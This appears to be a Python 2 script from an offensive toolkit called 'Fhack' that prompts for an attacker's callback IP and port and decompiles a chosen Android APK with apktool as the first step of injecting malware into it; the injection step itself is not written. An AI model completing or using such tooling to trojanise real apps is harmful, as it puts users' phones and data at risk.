try:
    from src.libs import BS
    import sys, os
    from src.Colors import TextColor
    import subprocess as subproc
    from time import sleep
except Exception as error:
    raise SystemExit, '\033[31m' + '%s' % error + "\033[0m"

decomOutPutPath = os.getcwd() + "/outputs/Malwares/"


def Decompile():
    print
    print TextColor.WARNING + "[+] Decompiling TARGET -- Please wait" + TextColor.WHITE

    command = ['apktool', '--version']
    # Check that apktool is install in system
    process = subproc.Popen(command, stdout=subproc.PIPE, stderr=subproc.PIPE)
    apktoolVersion, error = process.communicate()

    if "2." not in apktoolVersion:
        raise SystemExit, TextColor.RED + "[-] You do not have  << apktool >> please install it from setup.py" + \
                          TextColor.WHITE
    else:

        EndpointIp = raw_input(TextColor.CVIOLET + '~/Fhack/# Enter your RHOST(Your IP): ' + TextColor.WHITE)

        EndpointPORT = int(raw_input(TextColor.CVIOLET + "~/Fhack/# Enter your RPORT(Your PORT): " + TextColor.WHITE))

        if EndpointPORT > 65535:
            raise SystemExit, TextColor.RED + "We have not port bigger than 65535 ... !" + TextColor.WHITE

        apkPath = raw_input(TextColor.CVIOLET + "~/Fhack/# Enter apk(application) full path: " + TextColor.WHITE)

        print
        print TextColor.WARNING + "---------- Starting the process ----------"
        sleep(1)
        print TextColor.WHITESMOKE + "[*] Please wait to complete this setp"


        # Decompiling application with apk tool
        outPutApkDirectory = (apkPath.split('/')[-1]).split('.')[0]
        command = ["apktool", "d", "-f", "-r", apkPath,
                   '-o', decomOutPutPath + "CreateMalware/Android/" + outPutApkDirectory]
        process = subproc.Popen(command, stdout=subproc.PIPE, stderr=subproc.PIPE)
        result = process.communicate()[0]  # end decompiling

        if "error" in result:
            print TextColor.RED + "[-] APKTool have error on decompiling: %s" % result + TextColor.WHITE
            print
            return None
        else:
            print TextColor.GREEN + "[+] APKTool Decompile was success"
            print
            return decomOutPutPath + "CreateMalware/Android/" + outPutApkDirectory


def InjectCode():
    # print 'comming soon please wait'
    # return

    if not os.path.exists(decomOutPutPath):
        os.mkdir(decomOutPutPath)

    print Decompile()  # first we decompile the target apk


if __name__ == "__main__":
    InjectCode()
